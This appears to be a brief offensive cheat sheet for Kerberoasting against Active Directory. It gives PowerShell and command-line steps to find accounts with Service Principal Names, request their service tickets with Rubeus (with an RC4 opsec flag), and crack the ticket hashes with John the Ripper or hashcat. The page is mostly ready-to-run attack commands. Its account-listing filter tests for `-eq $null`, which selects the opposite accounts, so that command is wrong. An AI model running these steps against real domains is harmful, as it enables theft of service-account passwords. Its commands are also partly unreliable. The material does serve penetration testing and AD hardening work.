# Kerberoasting

##

When a user account has a Service Principal Name, it is possible to request a Service Ticket for the service mentionned in the SPN.

The Service Ticket is encrypted with the password of the user account: it is possible to crack the ST to retrieve the user account's password.



## List users that have SPN

```powershell
> Get-ADUser -Filter {ServicePrincipalName -eq "$null"} -Properties ServicePrincipalName
```

## Request ST

This command requests a Service Ticket for user `username`. The `/rc4opsec` flag only requests tickets for user accounts that support RC4.&#x20;

```powershell
> Rubeus.exe kerberoast /user:<username> /simple /nowrap /rc4opsec /outfile:hashes.txt
```

## Crack with JtR or hashcat

```powershell
> john.exe --wordlist=<path_to_wordlist> hashes.txt
> hashcat -m 13100 hashes.txt <path_to_wordlist>
```
